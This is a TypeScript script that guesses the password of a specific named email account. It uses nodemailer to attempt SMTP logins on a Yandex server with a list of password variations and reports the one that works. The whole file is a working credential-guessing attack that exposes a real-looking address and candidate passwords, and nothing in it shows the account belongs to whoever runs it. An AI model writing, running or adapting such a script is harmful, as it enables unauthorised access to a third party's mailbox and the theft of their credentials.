
import * as nodemailer from 'nodemailer';

async function testPassword(password: string) {
    const transporter = nodemailer.createTransport({
        host: 'smtp.yandex.com.tr',
        port: 465,
        secure: true,
        auth: {
            user: 'ayse@izmiracikhavareklam.com',
            pass: password,
        }
    });

    try {
        await transporter.verify();
        return true;
    } catch (error) {
        return false;
    } finally {
        transporter.close();
    }
}

async function run() {
    const variations = [
        'ayse4310075',
        'Ayse4310075',
        'Ayse4310075.',
        'ayse4310075.',
        'Ayse4310075!',
        'ayse4310075!',
    ];

    for (const pw of variations) {
        console.log(`Testing: ${pw}...`);
        if (await testPassword(pw)) {
            console.log(`✅ SUCCESS: ${pw}`);
            process.exit(0);
        }
    }
    console.log('❌ All variations failed.');
}

run();
